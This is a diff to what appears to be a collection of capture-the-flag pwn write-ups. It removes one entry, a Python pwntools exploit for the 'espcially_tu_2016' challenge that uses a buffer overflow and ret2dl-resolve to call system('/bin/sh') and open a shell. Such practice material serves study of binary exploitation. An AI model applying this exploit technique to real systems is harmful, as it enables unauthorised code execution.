@@ -696,29 +696,6 @@ icon: icon-html
   r.interactive()
   ```
 
-* ###  espcially_tu_2016
-
-  ```python
-  from pwn import *
-  from roputils import *
-  #r = remote('pwn.buuoj.cn',20071)
-  r = process('./espcially_tu_2016')
-  rop = ROP('./espcially_tu_2016')
-  fuck = rop.section('.bss') + 0x800
-  payload = rop.fill(44)
-  payload += rop.call('gets', fuck)
-  payload += rop.call('gets', fuck)
-  payload += rop.dl_resolve_call(fuck + 20, fuck)
-  r.sendline(payload)
-  r.sendline('1')
-  payload = rop.string('/bin/sh')
-  payload += rop.fill(20, payload)
-  payload += rop.dl_resolve_data(fuck + 20, 'system')
-  payload += rop.fill(100, payload)
-  r.sendline(payload)
-  r.interactive()
-  ```
-
 * ### [HarekazeCTF2019]baby_rop
 
   ```python
